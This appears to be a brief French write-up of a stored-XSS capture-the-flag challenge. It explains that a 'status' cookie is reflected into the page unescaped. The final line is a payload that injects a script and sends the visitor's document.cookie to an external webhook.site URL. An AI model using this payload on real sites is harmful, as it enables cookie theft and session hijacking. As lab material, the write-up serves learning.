# XSS - Stockée 2

CTF qui m’apprend a toujours utiliser caido/burpsuite :

![[XSS_stocke_2_01_d8300be624.png]]  

On peut poster des messages, malheureusement tout ce qu’on essaie de faire rentrer dans le titre est effacé lors ce qu’il y a des balises et dans la partie message les <> sont transformés :

![[XSS_stocke_2_02_7252ebf02a.png]]

C’est la qu’il ne faut pas s’acharner ! On voit aussi qu’il y a un status : invite

Et la est la faille, avec caido on regarde la requête   

![[XSS_stocke_2_03_70eeb0ca41.png]]

Comme on le voit, on peut modifier les cookies : est le code n’est pas modifié.

On peut aussi les modifier en allant sur Inspecter>Application>Cookie

(Bon pour la tech de modifier les cookies sur la page ca ne fonctionne pas tout le temps sur caido)

Et je met ca dans le cookie status :

admin"><script>document.location=https://webhook.site/8586fba4-5439-4518-81a3-ee7008d106ca?name='%2Bdocument.cookie</script>
